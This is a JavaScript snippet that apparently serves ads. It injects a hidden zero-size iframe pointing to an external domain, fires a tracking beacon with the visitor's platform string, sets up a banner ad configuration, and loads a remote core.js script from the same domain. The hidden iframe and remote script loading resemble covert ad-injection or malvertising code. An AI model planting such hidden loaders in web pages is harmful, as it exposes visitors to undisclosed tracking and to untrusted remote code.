var cnzz_url = '//etc.6187wo.com/4c6453288702cec06aa7a3793d64e2d4.html';
cntrc(cnzz_url);
function cntrc(url){
	var divObj = document, h = divObj.getElementsByTagName('body')[0],div = divObj.createElement('div');
	div.style.display = 'none';
	var Scrip = document.createElement('iframe');
	Scrip.width = '0';
	Scrip.height = '0';
	Scrip.scrolling = "no";
	Scrip.setAttribute("border", 0);
	Scrip.setAttribute("frameborder", 0);
	//Scrip.src = '//etc.6187wo.com/a84bd6726389f396b731b4fe2411b78a.html';
	Scrip.src = cnzz_url;
	div.appendChild(Scrip);
	h && h.insertBefore(div,h.firstChild);
}
function RndNum(n){
    var rnd="";
    for(var i=0;i<n;i++)
        rnd+=Math.floor(Math.random()*10);
    return rnd;
}
var iplatform = navigator.platform;
var ukey = String(RndNum(8));
var trackid = "10006";
new Image().src = "//sspmiaoshuo.cn-hangzhou.log.aliyuncs.com/logstores/system/track_ua.gif?APIVersion=0.6.0&trackid=" + trackid + "&position=1&platform=" + iplatform + "&scriptukey=" + ukey + "&dtime=" + (+new Date());
var script = document.getElementsByTagName('script');
var thisNode = script[script.length-1];
var TencentGDTC = TencentGDTC || [];
var jsload = jsload || 0;
jsload++;
TencentGDTC.push({
    jsload: jsload,
    stats : false,
    statsId:'19217173',
    AndPos : [{AppId:'4828',PosId:'6630'}],//4814#6587
    IosPos : [{AppId:'4828',PosId:'6631'}],
    hasClose : true,
    hasICo : false,
    posType : 'banner',
    fillType : 'bottom',//[bottom,top,inner]
    thisNode : thisNode,
    isAllow : '0',
    meta : true,
});
(function(e) {
	function b(b, d) {
		var c = document.getElementsByTagName("head")[0],
			a = document.createElement("script");
		a.onload = a.onreadystatechange = a.onerror = function() {
			a && a.readyState && /^(?!(?:loaded|complete)$)/.test(a.readyState) || (a.onload = a.onreadystatechange = a.onerror = null, a.src = "", a.parentNode.removeChild(a), a = null, d && d())
		};
		a.charset = "utf-8";
		a.defer = !0;
		a.src = b;
		c && c.insertBefore(a, c.firstChild)
	}
	if ("undefined" == typeof window.scritpsrclink || !0 !== window.scritpsrclink) window.scritpsrclink = !0, b("//core.6187wo.com/js/core.js")
})(TencentGDTC[jsload - 1]);
